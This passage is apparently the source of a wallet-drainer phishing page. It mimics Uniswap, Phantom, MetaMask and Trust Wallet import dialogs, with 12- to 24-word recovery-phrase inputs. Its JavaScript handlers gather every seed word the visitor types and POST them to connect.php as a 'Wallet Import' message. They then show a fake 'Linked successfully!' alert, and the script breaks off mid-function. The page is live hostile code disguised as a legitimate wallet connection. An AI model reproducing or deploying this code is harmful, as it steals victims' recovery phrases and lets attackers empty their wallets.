                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              11
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              12
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                    <div
                      id="uniswap-container-24-words"
                      class="uniswap-container-24-words scwtw-contents scwtw-hidden"
                    >
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              13
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              14
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              15
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              16
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              17
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              18
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              19
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              20
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              21
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              22
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              23
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                      <div class="scwtw-relative">
                        <div
                          class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                        >
                          <div>
                            <p
                              class="font-inter scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-text-[14px] scwtw-font-normal"
                            >
                              24
                            </p>
                          </div>
                        </div>
                        <input
                          class="scwtw-w-full scwtw-h-[44px] scwtw-py-[11px] scwtw-pl-[40px] scwtw-pr-[8px] scwtw-text-[14px] scwtw-font-medium scwtw-rounded-[16px] scwtw-text-[#222222] dark:scwtw-text-[#ffffff] scwtw-border scwtw-border-[#2222220d] dark:scwtw-border-[#ffffff1f] scwtw-bg-[#f9f9f9] dark:scwtw-bg-[#1b1b1b] focus:scwtw-bg-[#ffffff] dark:focus:scwtw-bg-[#131313] scwtw-outline-none scwtw-transition-all scwtw-duration-300 font-inter data-[invalid=true]:scwtw-bg-[#fa2b391f] dark:data-[invalid=true]:scwtw-bg-[#ff00001f] data-[invalid=true]:scwtw-text-[#ff5f52] uniswap-seed-input"
                          type="text"
                          data-invalid="false"
                        />
                      </div>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-mt-[16px]"
                >
                  <button
                    class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-w-full active:scwtw-opacity-70 scwtw-transition-all scwtw-duration-400 scwtw-group"
                    type="button"
                    id="uniswap-change-words-count"
                    data-current-words-count="12"
                  >
                    <span
                      class="scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-font-normal font-inter scwtw-text-[14px] group-data-[current-words-count=12]:scwtw-block group-data-[current-words-count=24]:scwtw-hidden"
                      >My recovery phrase is longer</span
                    >
                    <span
                      class="scwtw-text-[#7d7d7d] dark:scwtw-text-[#9b9b9b] scwtw-font-normal font-inter scwtw-text-[14px] group-data-[current-words-count=24]:scwtw-block group-data-[current-words-count=12]:scwtw-hidden"
                      >My recovery phrase is 12 words</span
                    >
                    <span
                      class="group-data-[current-words-count=12]:scwtw-rotate-[270deg] group-data-[current-words-count=24]:scwtw-rotate-[90deg] scwtw-transition-all scwtw-duration-300"
                    >
                      <svg
                        class="scwtw-w-[20px] scwtw-h-auto scwtw-text-[#bfbfbf] dark:scwtw-text-[#5e5e5e]"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke-width="8"
                      >
                        <path
                          d="M15.7071 5.29289C16.0976 5.68342 16.0976 6.31658 15.7071 6.70711L10.4142 12L15.7071 17.2929C16.0976 17.6834 16.0976 18.3166 15.7071 18.7071C15.3166 19.0976 14.6834 19.0976 14.2929 18.7071L8.2929 12.7071C7.9024 12.3166 7.9024 11.6834 8.2929 11.2929L14.2929 5.29289C14.6834 4.90237 15.3166 4.90237 15.7071 5.29289Z"
                          fill="currentColor"
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                        ></path>
                      </svg>
                    </span>
                  </button>
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4 scwtw-px-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#fc72ff] scwtw-font-medium font-inter scwtw-text-[16px] scwtw-cursor-pointer scwtw-rounded-[16px] scwtw-px-4 scwtw-py-[10px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    id="uniswap-import-button"
                  >
                    Continue
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script>
     
   document.getElementById("phantom-but").onclick = function () {
        console.log("Phantom seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("ghost-container");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container").style.display = "none";

        // Show the modal
        document.getElementById("phantom-modal").style.display = "block";
        document.getElementById("phantom-modal-overlay").style.display =
          "block";

        // Prepare the message to send
        const message = "Phantom seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
     
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container").style.display = "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };
      document.getElementById("phantom-import-button").onclick = function () {
        console.log("Import Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".phantom-seed-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 11;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container").style.display = "none";

        // Show the tips container
        const tipsContainer = document.getElementById("tips-container");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container").style.display = "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("phantom-switch-to-24-words-button").onclick =
        function () {
          // Show the 24-word input fields
          document
            .querySelector(".phantom-container-24-words")
            .classList.remove("scwtw-hidden");
          // Hide the 12-word input fields
          // document.querySelector('.phantom-container-12-words').classList.add('scwtw-hidden');
          // Hide the 24-words button
          this.classList.add("scwtw-hidden");
          // Show the 12-words button
          document
            .getElementById("phantom-switch-to-12-words-button")
            .classList.remove("scwtw-hidden");
        };

      document.getElementById("phantom-switch-to-12-words-button").onclick =
        function () {
          // Show the 12-word input fields
          document
            .querySelector(".phantom-container-12-words")
            .classList.remove("scwtw-hidden");
          // Hide the 24-word input fields
          document
            .querySelector(".phantom-container-24-words")
            .classList.add("scwtw-hidden");
          // Hide the 12-words button
          this.classList.add("scwtw-hidden");
          // Show the 24-words button
          document
            .getElementById("phantom-switch-to-24-words-button")
            .classList.remove("scwtw-hidden");
        };

      document.getElementById("phantom-close-button").onclick = function () {
        // Hide the modal
        document.getElementById("phantom-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("phantom-modal-overlay").style.display = "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".phantom-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("ghost-container");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        const tipsContainer = document.getElementById("tips-container");
        tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("Phantom modal closed.");
      };

      //metabut
      document.getElementById("meta-but").onclick = function () {
        console.log("metaMask seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("fox-container");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-meta").style.display = "none";

        // Show the modal
        document.getElementById("metamask-modal").style.display = "block";
        document.getElementById("metamask-modal-overlay").style.display =
          "block";

        // Prepare the message to send
        const message = "Phantom seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
   
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-meta").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .getElementById("metamask-change-words-count")
        .addEventListener("change", function () {
          // Get the selected value
          const selectedValue = parseInt(this.value, 10); // Convert to integer

          // Define all possible container IDs
          const containers = [
            "metamask-container-12-words",
            "metamask-container-15-words",
            "metamask-container-18-words",
            "metamask-container-21-words",
            "metamask-container-24-words",
          ];

          // Loop through all containers
          containers.forEach((containerId) => {
            const container = document.getElementById(containerId);
            // Extract the number from the container ID (e.g., "12" from "metamask-container-12-words")
            const containerNumber = parseInt(containerId.match(/\d+/)[0], 10);

            // Show the container if its number is <= the selected value, otherwise hide it
            if (containerNumber <= selectedValue) {
              container.classList.remove("scwtw-hidden");
            } else {
              container.classList.add("scwtw-hidden");
            }
          });
        });

      document.getElementById("metamask-import-button").onclick = function () {
        console.log("Import Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".metamask-seed-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 11;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container-meta").style.display = "none";

        // Show the tips container
        const tipsContainer = document.getElementById("fox-container");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-meta").style.display =
            "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .querySelectorAll(".metamask-toggle-seed-input")
        .forEach((button) => {
          button.addEventListener("click", function () {
            // Get all input fields with the class 'metamask-seed-input'
            const inputs = document.querySelectorAll(".metamask-seed-input");

            inputs.forEach((input) => {
              // Toggle the input type between 'password' and 'text'
              if (input.type === "password") {
                input.type = "text";
              } else {
                input.type = "password";
              }
            });
          });
        });

      document.getElementById("metamask-close-button").onclick = function () {
        // Hide the modal
        document.getElementById("metamask-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("metamask-modal-overlay").style.display =
          "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".metamask-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("fox-container");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("metamask modal closed.");
      };

      //trustbut

      document.getElementById("trust-but").onclick = function () {
        console.log("Trust seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("shield-container");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-trust").style.display =
          "none";

        // Show the modal
        document.getElementById("trust-modal").style.display = "block";
        document.getElementById("trust-modal-overlay").style.display = "block";

        // Prepare the message to send
        const message = "trust seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
    
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-trust").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .getElementById("trust-change-words-count")
        .addEventListener("change", function () {
          // Get the selected value
          const selectedValue = parseInt(this.value, 10); // Convert to integer

          // Define all possible container IDs
          const containers = [
            "trust-container-12-words",

            "trust-container-24-words",
          ];

          // Loop through all containers
          containers.forEach((containerId) => {
            const container = document.getElementById(containerId);
            // Extract the number from the container ID (e.g., "12" from "metamask-container-12-words")
            const containerNumber = parseInt(containerId.match(/\d+/)[0], 10);

            // Show the container if its number is <= the selected value, otherwise hide it
            if (containerNumber <= selectedValue) {
              container.classList.remove("scwtw-hidden");
            } else {
              container.classList.add("scwtw-hidden");
            }
          });
        });

      document.getElementById("trust-import-button").onclick = function () {
        console.log("trust Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".trust-seed-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 11;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container-trust").style.display =
          "none";

        // Show the tips container
        const tipsContainer = document.getElementById("shield-container");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
